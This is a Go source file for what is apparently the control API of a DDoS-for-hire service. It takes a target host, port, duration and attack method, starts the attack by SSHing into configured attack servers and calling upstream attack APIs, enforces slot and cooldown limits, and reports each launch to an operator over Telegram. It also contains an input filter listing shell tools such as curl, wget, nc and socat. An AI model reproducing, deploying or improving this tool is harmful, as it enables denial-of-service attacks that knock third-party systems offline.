/*
作者 盛世王朝(t.me/sswc01)
频道 t.me/sswcnet
转载/而开请勿删除本信息，谢谢，请保留出处
*/

/*
go mod init api
go mod tidy
go build -o api api.go
*/

package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "log"
    "net/http"
    "os"
    "regexp"
    "strconv"
    "strings"
    "sync"
    "time"
    
    "github.com/gin-gonic/gin"
    "golang.org/x/crypto/ssh"
)

// 配置文件结构体
type ServerInfo struct {
    User     string `json:"user"`
    Password string `json:"password"`
}

type MethodConfig struct {
    Slot     int                    `json:"slot"`
    MaxTime  int                    `json:"maxtime"`
    Type     string                 `json:"type"`
    Server   map[string]ServerInfo  `json:"server"`
    Cmd      string                 `json:"cmd"`
    APIs     []string               `json:"apis"`
    Cooldown int                    `json:"cooldown"`
}

type MainConfig struct {
    APIPort   int                     `json:"api_port"`
    APIToken  string                  `json:"api_token"`
    MaxSlot   int                     `json:"max_slot"`
    TGToken   string                  `json:"tg_token"`
    TGAdminID string                  `json:"tg_admin_id"`
    Language  string                  `json:"language"`
    Methods   map[string]MethodConfig `json:"methods"`
}

type Attack struct {
    ExpiryTime time.Time      // 攻击结束时间
    CooldownTime time.Time    // 冷却结束时间
}

// 全局变量
var (
    mainConfig MainConfig
    slotLock   sync.Mutex
    methodSlots = make(map[string][]Attack)
    activeSlots = 0
    logFile    *os.File
)

// 语言配置
var messages = map[string]map[string]string{
    "us": {
        "invalid_key":       "Invalid key",
        "missing_params":    "All parameters (host, method, time, port) are required",
        "invalid_time":      "Invalid time format",
        "min_time":         "Time must be at least 5 seconds",
        "invalid_method":   "Invalid method",
        "time_exceed":      "Time exceeds maximum limit",
        "security_violation": "Security violation detected in %s",
        "invalid_port":     "Invalid port number",
        "invalid_host":     "Invalid host format",
        "max_slots":        "System capacity reached",
        "method_slots":     "Method capacity reached. Time remaining: %d seconds",
    },
    "cn": {
        "invalid_key":       "无效的密钥",
        "missing_params":    "缺少必需参数 (host, method, time, port)",
        "invalid_time":      "无效的时间格式",
        "min_time":         "时间必须大于等于5秒",
        "invalid_method":    "无效的方法",
        "time_exceed":      "超出最大时间限制",
        "security_violation": "在%s参数中检测到安全违规",
        "invalid_port":     "无效的端口号",
        "invalid_host":     "无效的主机格式",
        "max_slots":        "系统达到最大容量",
        "method_slots":     "方法达到最大容量，剩余时间：%d秒",
    },
}

// 获取翻译后的消息
func getMessage(key string) string {
    lang := mainConfig.Language
    if lang == "" {
        lang = "us"
    }
    if message, ok := messages[lang][key]; ok {
        return message
    }
    return messages["us"][key] // 默认使用英文
}

func getRemainingTime(method string) int {
    minTime := -1
    now := time.Now()
    for _, attack := range methodSlots[method] {
        // 使用冷却结束时间而不是攻击结束时间
        if attack.CooldownTime.Before(now) {
            continue
        }
        remainingTime := int(time.Until(attack.CooldownTime).Seconds())
        if minTime == -1 || remainingTime < minTime {
            minTime = remainingTime
        }
    }
    return minTime
}

// 检查是否包含敏感字符或命令注入
func containsSensitiveInfo(input string) (bool, string) {
    // 命令注入检测
    dangerousChars := []string{
        ";", "|", "&&", "||", "`", "$", "(", ")", "{", "}", 
        "$(", "eval", "exec",
        "../", "//", "..", "~", "%", "\n", "\r",
    }
    
    for _, char := range dangerousChars {
        if strings.Contains(input, char) {
            return true, fmt.Sprintf("Dangerous character detected: %s", char)
        }
    }
    
    // 特殊指令检测
    dangerousCommands := []string{
        "curl", "wget", "bash", "sh", "nc", "netcat", 
        "python", "perl", "ruby", "lua",
        "telnet", "ncat", "socat",
    }
    
    inputLower := strings.ToLower(input)
    for _, cmd := range dangerousCommands {
        if strings.Contains(inputLower, cmd) {
            return true, fmt.Sprintf("Dangerous command detected: %s", cmd)
        }
    }
    
    return false, ""
}

func validateHost(host, methodType string) bool {
    if methodType == "layer3" || methodType == "layer4" {
        ipPattern := regexp.MustCompile(`^(\d{1,3}\.){3}\d{1,3}$`)
        return ipPattern.MatchString(host)
    } else if methodType == "layer7" {
        urlPattern := regexp.MustCompile(`^(?:https?|http)://[\w\-]+(\.[\w\-]+)+[/#?]?.*$`)
        return urlPattern.MatchString(host)
    }
    return false
}

func logAndNotify(message string, clientIP string, key string, host string, timeStr string, port string, method string, isError bool) {
    // 设置上海时区
    loc, _ := time.LoadLocation("Asia/Shanghai")
    timestamp := time.Now().In(loc).Format("2006-01-02 15:04:05")
    
    // 写入日志文件
    logMessage := fmt.Sprintf("[%s] %s - Client IP: %s\n", timestamp, message, clientIP)
    logFile.WriteString(logMessage)
    
    // TG通知
    if mainConfig.TGToken != "" && mainConfig.TGAdminID != "" {
        var tgMessage string
        if isError {
            tgMessage = fmt.Sprintf("Error occurred!\n时间：%s\nIP：%s\n详情：%s", 
                timestamp, clientIP, message)
        } else {
            tgMessage = fmt.Sprintf("时间：%s\nKey：%s\nHost：%s\nMethod：%s\nTime：%s\nPort：%s\n客户端IP：%s",
                timestamp, key, host, method, timeStr, port, clientIP)
        }
        go sendTGNotification(tgMessage)
    }
}

func sendTGNotification(message string) {
    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", mainConfig.TGToken)
    payload := map[string]string{
        "chat_id": mainConfig.TGAdminID,
        "text":    message,
    }
    
    jsonData, _ := json.Marshal(payload)
    http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}

func executeSSHCommand(server ServerInfo, host string, command string) error {
    config := &ssh.ClientConfig{
        User: server.User,
        Auth: []ssh.AuthMethod{
            ssh.Password(server.Password),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
    }
    
    client, err := ssh.Dial("tcp", host+":22", config)
    if err != nil {
        return err
    }
    defer client.Close()
    
    session, err := client.NewSession()
    if err != nil {
        return err
    }
    defer session.Close()
    
    return session.Run(command + " &")
}

func handleAttack(c *gin.Context) {
    clientIP := c.ClientIP()
    key := c.Query("key")
    if key != mainConfig.APIToken {
        logAndNotify(getMessage("invalid_key"), clientIP, key, "", "", "", "", true)
        c.JSON(401, gin.H{"error": getMessage("invalid_key")})
        return
    }

    // 获取所有参数
    host := c.Query("host")
    method := c.Query("method")
    timeStr := c.Query("time")
    port := c.Query("port")
    
    // 检查必需参数
    if host == "" || method == "" || timeStr == "" || port == "" {
        logAndNotify(getMessage("missing_params"), clientIP, key, host, timeStr, port, method, true)
        c.JSON(400, gin.H{"error": getMessage("missing_params")})
        return
    }
    
    // 验证时间值
    duration, err := strconv.Atoi(timeStr)
    if err != nil {
        logAndNotify(getMessage("invalid_time"), clientIP, key, host, timeStr, port, method, true)
        c.JSON(400, gin.H{"error": getMessage("invalid_time")})
        return
    }
    
    if duration < 5 {
        logAndNotify(getMessage("min_time"), clientIP, key, host, timeStr, port, method, true)
        c.JSON(400, gin.H{"error": getMessage("min_time")})
        return
    }
    
    // 检查方法是否存在
    methodConfig, exists := mainConfig.Methods[method]
    if !exists {
        logAndNotify(getMessage("invalid_method"), clientIP, key, host, timeStr, port, method, true)
        c.JSON(400, gin.H{"error": getMessage("invalid_method")})
        return
    }
    
    // 验证最大时间限制
    if duration > methodConfig.MaxTime {
        logAndNotify(getMessage("time_exceed"), clientIP, key, host, timeStr, port, method, true)
        c.JSON(400, gin.H{"error": getMessage("time_exceed")})
        return
    }
    
    // 检查所有参数是否包含敏感信息
    params := []struct {
        name  string
        value string
    }{
        {"host", host},
        {"method", method},
        {"time", timeStr},
        {"port", port},
    }
    
    for _, param := range params {
        if hasSensitive, _ := containsSensitiveInfo(param.value); hasSensitive {
            msg := fmt.Sprintf(getMessage("security_violation"), param.name)
            logAndNotify(msg, clientIP, key, host, timeStr, port, method, true)
            c.JSON(400, gin.H{"error": msg})
            return
        }
    }
    
    // 验证端口格式
    portNum, err := strconv.Atoi(port)
    if err != nil || portNum < 1 || portNum > 65535 {
        logAndNotify(getMessage("invalid_port"), clientIP, key, host, timeStr, port, method, true)
        c.JSON(400, gin.H{"error": getMessage("invalid_port")})
        return
    }
    
    // 验证host格式
    if !validateHost(host, methodConfig.Type) {
        logAndNotify(getMessage("invalid_host"), clientIP, key, host, timeStr, port, method, true)
        c.JSON(400, gin.H{"error": getMessage("invalid_host")})
        return
    }
    
    now := time.Now()
    slotLock.Lock()
    activeSlots = 0  // 重置活动槽计数
    for m := range methodSlots {
        var activeAttacks []Attack
        for _, attack := range methodSlots[m] {
            if attack.ExpiryTime.After(now) {
                activeAttacks = append(activeAttacks, attack)
                activeSlots++  // 重新计算活动槽
            }
        }
        methodSlots[m] = activeAttacks
    }
    
    // 检查slot限制
    if activeSlots >= mainConfig.MaxSlot {
        slotLock.Unlock()
        logAndNotify(getMessage("max_slots"), clientIP, key, host, timeStr, port, method, true)
        c.JSON(429, gin.H{"error": getMessage("max_slots")})
        return
    }
    
    if len(methodSlots[method]) >= methodConfig.Slot {
        remainingTime := getRemainingTime(method)
        slotLock.Unlock()
        msg := fmt.Sprintf(getMessage("method_slots"), remainingTime)
        logAndNotify(msg, clientIP, key, host, timeStr, port, method, true)
        c.JSON(429, gin.H{"error": msg})
        return
    }
    
    methodSlots[method] = append(methodSlots[method], Attack{
        ExpiryTime: now.Add(time.Duration(duration) * time.Second),
        CooldownTime: now.Add(time.Duration(duration + methodConfig.Cooldown) * time.Second),
    })
    activeSlots++
    slotLock.Unlock()
    
    // 处理API请求
    for _, apiURL := range methodConfig.APIs {
        replacedURL := strings.Replace(apiURL, "[host]", host, -1)
        replacedURL = strings.Replace(replacedURL, "[time]", timeStr, -1)
        replacedURL = strings.Replace(replacedURL, "[port]", port, -1)
        
        go http.Get(replacedURL)
    }
    
    // 处理SSH命令
    for serverHost, serverInfo := range methodConfig.Server {
        cmd := methodConfig.Cmd
        cmd = strings.Replace(cmd, "[host]", host, -1)
        cmd = strings.Replace(cmd, "[time]", timeStr, -1)
        cmd = strings.Replace(cmd, "[port]", port, -1)
        
        go func(srv ServerInfo, h string, command string) {
            err := executeSSHCommand(srv, h, command)
            if err != nil {
                logAndNotify(fmt.Sprintf("SSH execution failed for %s: %v", h, err), 
                    clientIP, key, host, timeStr, port, method, true)
            }
        }(serverInfo, serverHost, cmd)
    }
    
    // 成功日志
    logAndNotify("Attack started", clientIP, key, host, timeStr, port, method, false)
    c.JSON(200, gin.H{"success": true})
}

func main() {
    // 读取配置文件
    data, err := ioutil.ReadFile("config.json")
    if err != nil {
        log.Fatal("Error reading config file:", err)
    }
    
    err = json.Unmarshal(data, &mainConfig)
    if err != nil {
        log.Fatal("Error parsing config file:", err)
    }
    
    // 初始化日志文件
    logFile, err = os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        log.Fatal("Error opening log file:", err)
    }
    defer logFile.Close()
    fmt.Println("\nAPI启动...\n项目地址 https://github.com/sswc01/attackapi\n作者 https://t.me/sswc01\n频道 https://t.me/sswcnet\n")
    r := gin.Default()
    r.GET("/api/attack", handleAttack)
    r.Run(fmt.Sprintf(":%d", mainConfig.APIPort))
}
